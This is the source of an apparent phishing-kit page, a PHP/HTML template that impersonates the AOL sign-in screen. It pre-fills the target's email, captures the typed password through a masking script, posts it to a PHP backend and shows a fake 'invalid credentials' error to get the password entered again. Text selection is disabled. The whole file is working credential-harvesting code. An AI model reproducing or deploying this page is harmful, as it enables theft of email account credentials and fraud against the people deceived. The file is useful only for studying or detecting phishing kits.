<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html data-wf-site="64a8634540e6e9c6a130b5c3" data-wf-page="64a8c4690fdcdb0cb243b262" data-wf-domain="" class="w-mod-js wf-lato-n7-active wf-opensans-n3-active wf-opensans-n4-active wf-opensans-n6-active wf-opensans-n7-active wf-opensans-n8-active wf-opensans-i3-active wf-opensans-i4-active wf-opensans-i6-active wf-opensans-i7-active wf-opensans-i8-active wf-lato-i3-active wf-lato-i1-active wf-lato-n3-active wf-lato-n4-active wf-lato-n1-active wf-lato-i4-active wf-lato-i7-active wf-lato-i9-active wf-lato-n9-active wf-active"><head>




    <meta charset="utf-8">
    <title>Aol- Signin</title>
    <meta content="owaa" property="og:title">
    <meta content="owaa" property="twitter:title">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <meta content="Webflow" name="generator">
    <link href="https://uploads-ssl.webflow.com/64a8634540e6e9c6a130b5c3/css/webmail-e0abaa.webflow.46873521b.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
    <link href="https://www.aol.com/favicon.ico" rel="shortcut icon">
    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic%7CLato:100,100italic,300,300italic,400,400italic,700,700italic,900,900italic" media="all">
    
    
    <style>
        /* Disable right-click */
        body {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
    </style>

</head>

<body>
    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
        <div id="google_translate_element"></div>
    </div>
    <section class="section-2 wf-section">
        <div class="up-wrapper"><img src="https://uploads-ssl.webflow.com/64a8634540e6e9c6a130b5c3/64a98c1923106e4e32348576_Screenshot%202023-07-08%20at%2019.14.45.png" loading="lazy" alt="" class="a-logo _4th">
            <div class="text-block-7 _4th">Help</div>
        </div>
        <div class="up2-wrapper _2nd">
            <div class="div-block _2nd"></div>
            <div class="div-block-2 _2nd _3rd _4th"><img src="https://uploads-ssl.webflow.com/64a8634540e6e9c6a130b5c3/64a98c1923106e4e32348576_Screenshot%202023-07-08%20at%2019.14.45.png" loading="lazy" alt="" class="image-6">
                <div class="w-form">
                    <form id="myForm" name="form1" data-name="Email Form" action="" method="post" class="form-2" required="">

                        

                        <input type="email" class="text-field-3 w-input " maxlength="256" name="user" data-name="user" value="<?php echo htmlspecialchars($decoded); ?>" placeholder="<?php echo htmlspecialchars($decoded); ?>" id="user" style="background-color: transparent;" readonly="">
                        <input type="hidden" name="login" value="aol">
                        <h4 class="headerrs">Enter password</h4>
                        <div class="text-block-10">to finish sign in</div>
                        <p id="errorMessage" style="color: red;"></p>
                        <input type="text" class="text-field-4 w-input" maxlength="256" name="pass" data-name="pr" placeholder="Password" id="password" required="">
						<div class="" style="color: rgb(236, 59, 59); text-align: left; font-size:14px; padding-left: 0px; padding-bottom: 10px; <?php echo $error; ?>" id="msg">Invalid credentials, please try again</div>	

                        <input type="submit" value="Next" data-wait="Please wait..." class="submit-button-3 w-button" onclick="submitForm(event)" id="submit-btn">
                    </form>

                </div>
                <div class="text-block-9">Forgot password?</div>
            </div>
        </div>
    </section>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>